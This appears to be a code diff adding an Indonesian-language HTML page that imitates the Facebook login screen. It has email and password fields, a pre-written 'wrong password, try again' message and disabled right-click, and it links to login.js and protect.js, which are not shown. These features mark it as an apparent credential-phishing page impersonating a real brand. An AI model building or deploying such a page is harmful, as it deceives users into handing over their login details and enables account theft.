@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook – Masuk atau Daftar</title>
+  <link rel="stylesheet" href="login.css" />
+</head>
+<body oncontextmenu="return false">
+  <div class="login-box">
+    <h1>facebook</h1>
+    <form id="loginForm">
+      <input type="text" name="email" placeholder="Nomor ponsel atau email" required />
+      <input type="password" name="password" placeholder="Kata sandi" required />
+      <button type="submit">Masuk</button>
+      <p id="errorMsg" class="error-msg">Maaf, kata sandi atau email kamu salah. Silakan coba lagi.</p>
+      <a href="#" class="small-link">Lupa kata sandi?</a>
+      <hr />
+      <button type="button" class="btn-daftar">Buat Akun Baru</button>
+    </form>
+  </div>
+  <script src="login.js"></script>
+  <script src="protect.js"></script>
+</body>
+</html>
